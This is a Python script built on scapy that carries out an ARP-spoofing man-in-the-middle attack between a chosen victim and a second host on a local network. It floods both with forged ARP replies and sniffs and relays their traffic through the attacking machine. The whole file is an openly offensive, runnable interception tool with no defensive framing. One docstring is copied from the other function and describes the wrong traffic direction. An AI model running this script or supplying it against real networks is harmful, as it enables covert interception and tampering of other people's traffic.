import argparse
import re

from scapy.all import send, AsyncSniffer
from scapy.arch import get_if_hwaddr
from scapy.layers.l2 import ARP, Ether
from scapy.all import conf
from scapy.packet import Packet
from scapy.sendrecv import srp, sendp

conf.verb = 0
conf.promisc = False


def get_mac(ip: str) -> str:
    """
    This function receives an IP, and uses ARP to find the MAC attached to that IP.
    :param ip: The IP.
    :return: str - The target's MAC.
    """

    arp_request_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answers, _ = srp(arp_request_broadcast, verbose=False)

    # Index 0 - The packet we sent, Index 1 - the packet we received
    first_answer = answers[0]
    received_packet = first_answer[1]

    return received_packet.hwsrc

def process_packet_from_target(own_mac_address: str, packet: Packet, host_mac: str) -> None:
    """
    This function processes a packet sent from our target to the host, and makes sure to change the correct variables before sending it to the host.
    :param own_mac_address: The MAC address of the host that is running this script.
    :param packet: The intercepted packet.
    :param host_mac: Our destination's MAC (AKA router).
    """
    modified_packet = packet.copy()
    modified_packet[Ether].src = own_mac_address
    modified_packet[Ether].dst = host_mac
    send(modified_packet, verbose=False)


def process_packet_to_target(own_mac_address: str, packet: Packet, victim_mac: str) -> None:
    """
    This function processes a packet sent from our target to the host, and makes sure to change the correct variables before sending it to the host.
    :param own_mac_address: The MAC address of the host that is running this script.
    :param packet: The intercepted packet.
    :param victim_mac: The victim host's mac address.
    """

    modified_packet = packet.copy()
    modified_packet[Ether].src = own_mac_address
    modified_packet[Ether].dst = victim_mac
    send(modified_packet, verbose=False)

def active_spoofing(src_ip: str, dst_ip: str, dst_mac: str) -> None:
    """
    This function receives 2 hosts, and acts as the ARP response from the src to the dst.
    :param src_ip: The src ip we want to impose as.
    :param dst_ip: The destination ip we want to trick.
    :param dst_mac: The destination mac we want to trick.
    """
    spoof_packet = Ether(dst=dst_mac) / ARP(op=2, psrc=src_ip, pdst=dst_ip, hwdst=dst_mac)
    sendp(spoof_packet, verbose=False)


def valid_ip(value):
    """
    Gets a value, and checks if the value follows the IP format.
    :param value: The value we want to check.
    :return: value if it's in the IP format, otherwise raises and error.
    """
    pattern = r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    if re.match(pattern, value):
        return value
    else:
        raise argparse.ArgumentTypeError(f"{value} is not a valid IP address")


def get_args():
    """
    Receives the arguments passed when running the script
    :return: Tuple[str, str] - target host ip & replace host ip
    """
    parser = argparse.ArgumentParser()

    parser.add_argument("target_host_ip", type=valid_ip, help="Our target, the host we want to attack")
    parser.add_argument("replace_host_ip", type=valid_ip, help="The target's destination we want to impose as")

    args = parser.parse_args()
    return args.target_host_ip, args.replace_host_ip


def main():
    target_host_ip, replace_host_ip = get_args()

    own_mac_address = get_if_hwaddr(conf.iface).upper()

    print("Retrieving both sides MAC addresses")
    victim_mac = get_mac(target_host_ip)
    host_mac = get_mac(replace_host_ip)

    print("Started intercepting packets")
    t1 = AsyncSniffer(filter=f"ether src {victim_mac} and ether dst {host_mac}",
                      prn=lambda packet: process_packet_from_target(own_mac_address, packet, host_mac), store=0)
    t2 = AsyncSniffer(filter=f"ether src {host_mac} and ether dst {victim_mac}",
                      prn=lambda packet: process_packet_to_target(own_mac_address, packet, victim_mac), store=0)
    t1.start()
    t2.start()

    print("Started active spoofing...")
    while True:
        active_spoofing(target_host_ip, replace_host_ip, host_mac)
        active_spoofing(replace_host_ip, target_host_ip, victim_mac)


if __name__ == "__main__":
    main()